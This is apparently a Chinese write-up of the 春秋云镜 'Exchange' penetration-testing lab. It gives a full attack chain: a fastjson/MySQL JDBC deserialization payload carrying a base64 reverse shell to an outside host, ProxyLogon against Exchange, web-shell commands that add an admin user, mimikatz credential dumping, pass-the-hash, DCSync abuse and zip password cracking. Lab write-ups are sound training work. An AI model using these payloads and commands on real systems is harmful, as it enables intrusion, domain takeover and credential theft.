---
title: "春秋云镜 Exchange"
onlyTitle: true
date: 2025-10-19 22:48:32
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8176.jpg
---





## 春秋云镜 Exchange

### flag1

39.99.147.114

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019200029908.png)

登陆页面http://39.99.147.114:8000/login.html

随便注册一个账号登陆进去

长得和华夏ERP一模一样

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019200254204.png)

版本为2.3

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019200219572.png)

首先华夏ERP这个版本有CVE-2024-0490，通过/user/getAllList可以信息泄露

把本地cookie全删去，可以看到有admin用户，密码拿去cmd5查表可以知道是123456，不过没什么用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019200607112.png)

网上搜索一下华夏ERP 2.3还有fastjson漏洞，默认fastjson版本为1.2.55

接口为/user/list?search=payload

加上cms自带了mysql有漏洞的依赖com.mysql.jdbc.JDBC4Connection，可以触发sethostToConnectTo打mysql jdbc反序列化

用evil-mysql-server项目

https://github.com/dushixiang/evil-mysql-server/releases/tag/v0.0.2

```sh
./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
```

```json
{
	"name": {
		"@type": "java.lang.AutoCloseable",
		"@type": "com.mysql.jdbc.JDBC4Connection",
		"hostToConnectTo": "117.72.74.197",
		"portToConnectTo": 3306,
		"info": {
			"user": "yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzIuNzQuMTk3LzE5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}",
			"password": "pass",
			"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
			"autoDeserialize": "true",
			"NUM_HOSTS": "1"
		}
	}
}
```

注意这里nc监听主机上的java版本要和开mysql主机java版本一致（用花生壳的伙伴注意了，别一个花生壳本机一个vps）

url编码：

```
%7B%0D%0A%09%22name%22%3A+%7B%0D%0A%09%09%22%40type%22%3A+%22java.lang.AutoCloseable%22%2C%0D%0A%09%09%22%40type%22%3A+%22com.mysql.jdbc.JDBC4Connection%22%2C%0D%0A%09%09%22hostToConnectTo%22%3A+%22117.72.74.197%22%2C%0D%0A%09%09%22portToConnectTo%22%3A+3306%2C%0D%0A%09%09%22info%22%3A+%7B%0D%0A%09%09%09%22user%22%3A+%22yso_CommonsCollections6_bash+-c+%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTcuNzIuNzQuMTk3LzE5OTkgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%2C%0D%0A%09%09%09%22password%22%3A+%22pass%22%2C%0D%0A%09%09%09%22statementInterceptors%22%3A+%22com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%22%2C%0D%0A%09%09%09%22autoDeserialize%22%3A+%22true%22%2C%0D%0A%09%09%09%22NUM_HOSTS%22%3A+%221%22%0D%0A%09%09%7D%0D%0A%09%7D%0D%0A%7D
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019204149792.png)

获取root shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019204149792.png)

flag01: flag{be3d11d8-9ce2-4c33-a010-36a5fabbf892}

### flag2

写个ssh，方便传文件

上传fscan，扫

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019205512028.png)

```
172.22.3.2 win16
172.22.3.9 EXC01 winServer 2016
172.22.3.26 没信息
172.22.3.12 本机
```

这里只能看出9 可能用了exchange，fscan给了访问连接

https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0

先代理出来

```
./gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/39.99.147.114:22 -F socks5://39.99.147.114:5555
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019210316778.png)

查看页面源代码，可以找到href中有exchange的版本号，15.1.1591

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019210405968.png)

可以打ProxyLogon

python2用这个

https://github.com/hausec/ProxyLogon

python3用这个

https://github.com/hosch3n/ProxyVulns/blob/main/26855.py

改一下users.txt的第一个

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019213053713.png)

python 26855.py 172.22.3.9

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019213127757.png)

打完写了加个用户，方便rdp上去

shell位于

https://172.22.3.9/aspnet_client/api.aspx

curl发包会报错，可能是我的curl版本问题，直接hackbar发包

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019214415307.png)

向shell post数据

```
api=Response.Write(new ActiveXObject("WScript.Shell").exec("net user godown qwerQ!1234 /add").stdout.readall())

api=Response.Write(new ActiveXObject("WScript.Shell").exec("net localgroup administrators godown /add").stdout.readall())
```

md，连上来就是什么B动静

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019214540773.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019214701531.png)

flag02: flag{b7020284-f353-4e1f-bc2a-cd9d2f13a2e9}



### flag4

这个机器上有个Zhangtong的用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019214806461.png)

先SharpHound收集一波

用shell执行，那个是域用户

api=Response.Write(new ActiveXObject("WScript.Shell").exec("net user godown qwerQ!1234 /add").stdout.readall())

但是好像还是不行？

那用mimikatz dump一下内存的用户，那个Zhongtong应该是域用户

```bash
api=Response.Write(new ActiveXObject("WScript.Shell").exec("C://Users//godown//Desktop//mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit").stdout.readall())
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019220620655.png)

这是否有点。。太乱了

全局搜索NTLM，找到Zhongtong的NTLM 22c7f81993e96ac83ac2f3f1903de8b4

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019220653966.png)

还有一个EXC01的票据

Username : XIAORANG-EXC01$  * Domain   : XIAORANG  * NTLM     : 856a97ee9934d2afdcf810df2a7a3416

直接在本地pth上去

```shell
python psexec.py -hashes :856a97ee9934d2afdcf810df2a7a3416 xiaorang.lab/XIAORANG-EXC01$@172.22.3.9 -codec gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019221733126.png)

进入到godown/Desktop目录下（之前rdp上传了SharpHound，收集一波）

现在所在用户的计算机对域控下的admin有writeDacl权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019222201325.png)

那打什么不用多说了，和delivery一样，可以写Dcsync权限后打Dcsync，也可以写RBCD后打委派攻击

添加Dcsync：

```
python dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :856a97ee9934d2afdcf810df2a7a3416 -action write -rights DCSync -principal Zhangtong -target-dn "DC=xiaorang,DC=lab" -dc-ip 172.22.3.2
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019222534149.png)

然后可以用mimikatz抓

mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit

额这里抓不到因为我写的DCSync是对Zhongtong的，而我登陆的是EXC01

重新写一遍

```
python dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :856a97ee9934d2afdcf810df2a7a3416 -action write -rights DCSync -principal EXC01$ -target-dn "DC=xiaorang,DC=lab" -dc-ip 172.22.3.2
```

额EXC01好像不受直接管辖（后面再看为什么吧截图先放这

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019223011256.png)

用DCSync dump NTLM

```
python secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019223156363.png)

得到

xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::

横向上去：

```
python wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019223413367.png)

flag04: flag{752752c4-0ad9-4bdc-90fb-5d720f11333a}



### flag3

这个我没打了，赶着买豆腐花，直接copy的

用这个项目，不过要python2

https://github.com/Jumbo-WJB/PTH_Exchange

把item-0-secret.zip dump下来

解压密码是电话18763918468，在同目录下的item-1-phone lists.csv

zip2john爆破

```sh
root@kali2 [~/PTH_Exchange/output] git:(main) ✗ ➜  zip2john item-0-secret.zip >aaa                       [13:18:12]
ver 2.0 item-0-secret.zip/flag.docx PKZIP Encr: cmplen=668284, decmplen=671056, crc=AFEF0968 ts=AB91 cs=afef type=8
root@kali2 [~/PTH_Exchange/output] git:(main) ✗ ➜  john aaa --wordlist=pass.txt                          [13:18:25]
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press 'q' or Ctrl-C to abort, almost any other key for status
18763918468      (item-0-secret.zip/flag.docx)     
1g 0:00:00:00 DONE (2025-02-14 13:18) 50.00g/s 12800p/s 12800c/s 12800C/s 13865779356..17743489974
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019224226528.png)
